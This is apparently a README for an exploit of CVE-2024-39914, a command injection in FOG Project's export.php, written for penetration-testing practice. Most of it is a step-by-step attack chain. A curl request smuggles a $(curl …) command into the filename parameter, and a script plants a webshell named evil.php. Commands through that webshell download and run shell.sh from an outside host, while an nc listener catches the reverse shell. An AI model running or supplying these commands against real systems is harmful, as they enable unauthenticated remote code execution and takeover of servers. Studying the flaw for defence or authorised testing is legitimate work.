‚ö†Ô∏è WARNING: This script is provided for educational and authorized penetration testing purposes only. Do not use it on systems you do not own or have explicit permission to test.

üôè CREDITS: The original script is from Tom Elliot [@mastacontrola](https://github.com/mastacontrola) and can be found [here](https://github.com/FOGProject/fogproject/security/advisories/GHSA-7h44-6vq6-cq8j)

üìö REFERRENCES:
1. [OffSec: CVE-2024-39914 ‚Äì Unauthenticated Command Injection in FOG Project‚Äôs export.php](https://www.offsec.com/blog/cve-2024-39914/)
2. [@mastacontrola: GHSA-7h44-6vq6-cq8j ](https://github.com/FOGProject/fogproject/security/advisories/GHSA-7h44-6vq6-cq8j)


## Exploit
Verify that the system is vulnerable before using the exploit.

1. Start a web server. Monitor the logs to confirm hit from target IP.
   ```bash
   python3 -m http.server 80
   ```
   
2. Send a payload to the system.
   ```bash
   curl -X POST "http://192.168.186.237/fog/management/export.php?filename=\$(curl+192.168.45.210)&type=pdf" \
        -d "fogguiuser=fog&nojson=2"
   ```

3. Proceed to use the [script](https://github.com/cw-l/oscp/blob/main/CVE-2024-39914/CVE-2024-39914.py) to insert webshell to the system, if vulnerable. Test that the webshell works.
   ```bash
   python3 ./CVE-2024-39914.py -t 192.168.138.88 -p 80 -f evil.php

   curl http://192.168.138.88/fog/management/evil.php?cmd=id
   ```

4. Transfer a reverse shell to the target via the webshell. Remember to encode the URL. The listener should catch a shell.
   ```bash
   curl http://192.168.138.88/fog/management/evil.php?cmd=curl%20-O%20http://192.168.45.168/shell.sh

   rlwrap nc -lvnp 443
   curl http://192.168.138.88/fog/management/evil.php?cmd=bash%20./shell.sh
   ```
